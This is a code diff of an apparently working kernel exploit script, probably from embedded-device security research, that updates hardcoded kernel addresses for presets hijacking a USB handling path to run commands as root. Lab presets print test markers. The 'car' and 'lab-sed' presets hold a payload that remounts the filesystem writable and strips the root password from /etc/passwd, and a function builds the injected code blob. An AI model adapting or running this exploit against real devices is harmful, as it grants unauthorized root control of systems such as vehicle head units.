@@ -26,15 +26,15 @@ PRESETS = {
     # name: (n_eps, hijack_idx, helper_addr, cmd)
     # NOTE: lab helper addrs below are for the UMHDBG-instrumented build
     # (patch-umh-debug.py v2, entry printk moves call_usermodehelper next to
-    # printk); clean-build addrs: call_usermodehelper 0x80039de8,
-    # sys_execve 0x800dad44, printk 0x803cde54.
-    'lab': (26, 25, 0x803cd338, 'echo "===PAYLOAD-RAN===" > /dev/console'),
-    'lab-printk': (26, 25, 0x803cd174, '===BLOB-RAN===\n'),  # debug: blx printk(fmt)
-    'lab-nowait': (26, 25, 0x803cd338, 'echo "===PAYLOAD-RAN===" > /dev/console', 0),
+    # printk). Rebuilds move them - re-read System.map after every
+    # build-kernel.sh run (addrs: gcc16 cross, 2026-10-11).
+    'lab': (26, 25, 0x8042e5f0, 'echo "===PAYLOAD-RAN===" > /dev/console'),
+    'lab-printk': (26, 25, 0x8042e464, '===BLOB-RAN===\n'),  # debug: blx printk(fmt)
+    'lab-nowait': (26, 25, 0x8042e5f0, 'echo "===PAYLOAD-RAN===" > /dev/console', 0),
     # UMH child EFAULTs on kernel-pointer argv; instead make khubd exec directly:
-    'lab-execve': (26, 25, 0x800dacec, 'echo "===PAYLOAD-RAN===" > /dev/console'),
+    'lab-execve': (26, 25, 0x800f0ac8, 'echo "===PAYLOAD-RAN===" > /dev/console'),
     # blob self-dump: printk B/sp/argv + slot values, then call UMH, then UDF
-    'lab-dump': (26, 25, 0x803cd338, 'echo "===PAYLOAD-RAN===" > /dev/console'),
+    'lab-dump': (26, 25, 0x8042e5f0, 'echo "===PAYLOAD-RAN===" > /dev/console'),
     'car': (27, 26, 0x8003e7c0,
             'mount -o remount,rw / ; '
             'sed -i "s|^root:[^:]*:0:0:root:/home/root:.*|root::0:0:root:/home/root:/bin/sh|" /etc/passwd ; '
@@ -42,7 +42,7 @@ PRESETS = {
     # lab-only: car sed command + dump result (mount/reboot make no sense on
     # the lab ramfs; the blob's b . spin blocks init on the 1-cpu VM, so the
     # payload itself must print the file)
-    'lab-sed': (26, 25, 0x803cd338,
+    'lab-sed': (26, 25, 0x8042e5f0,
                 'sed -i "s|^root:[^:]*:0:0:root:/home/root:.*|root::0:0:root:/home/root:/bin/sh|" /etc/passwd ; '
                 'sync ; cat /etc/passwd>/dev/console'),
 }
@@ -133,7 +133,7 @@ def build_dump(preset):
     the blx, call UMH, UDF after. Mirrors the generic tail exactly."""
     n_eps, hijack, helper, cmd = preset[:4]
     cmd_b = pad_cmd(cmd.encode(), n_eps)
-    PRINTK = 0x803cd174                       # instrumented-build printk
+    PRINTK = 0x8042e464                       # instrumented-build printk
 
     # code = 27 words = 108 bytes
     PATH_OFF, DASHC_OFF, CMD_OFF = 108, 116, 119
